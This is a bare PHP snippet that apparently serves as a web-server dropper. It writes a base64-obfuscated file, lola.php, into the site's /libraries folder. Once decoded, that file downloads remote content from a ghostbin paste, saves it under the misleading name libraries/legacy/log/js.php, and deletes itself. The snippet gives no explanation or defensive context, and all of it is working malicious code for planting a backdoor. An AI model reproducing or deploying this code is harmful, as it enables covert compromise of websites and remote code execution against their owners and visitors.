$check = $_SERVER['DOCUMENT_ROOT'] . "/libraries/lola.php" ;
$fp=fopen("$check","w+");
fwrite($fp,base64_decode('PD9waHANCmVjaG8gIm1hZ25vbSBhdXRvIGNyZWF0IGZpbGVzIjsNCg0KZnVuY3Rpb24gaHR0cF9nZXQoJHVybCl7DQoJJGltID0gY3VybF9pbml0KCR1cmwpOw0KCWN1cmxfc2V0b3B0KCRpbSwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQoJY3VybF9zZXRvcHQoJGltLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAxMCk7DQoJY3VybF9zZXRvcHQoJGltLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCgljdXJsX3NldG9wdCgkaW0sIENVUkxPUFRfSEVBREVSLCAwKTsNCglyZXR1cm4gY3VybF9leGVjKCRpbSk7DQoJY3VybF9jbG9zZSgkaW0pOw0KfQ0KJGNoZWNrNT0kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIi9saWJyYXJpZXMvbGVnYWN5L2xvZy9qcy5waHAiIDsNCiR0ZXh0NSA9IGh0dHBfZ2V0KCdodHRwczovL2dob3N0YmluLmNvbS9wYXN0ZS9hdzVjYS9yYXcnKTsNCiRvcDU9Zm9wZW4oJGNoZWNrNSwgJ3cnKTsNCmZ3cml0ZSgkb3A1LCR0ZXh0NSk7DQpmY2xvc2UoJG9wNSk7DQpAdW5saW5rKF9fRklMRV9fKTsNCj8+'));
fclose($fp);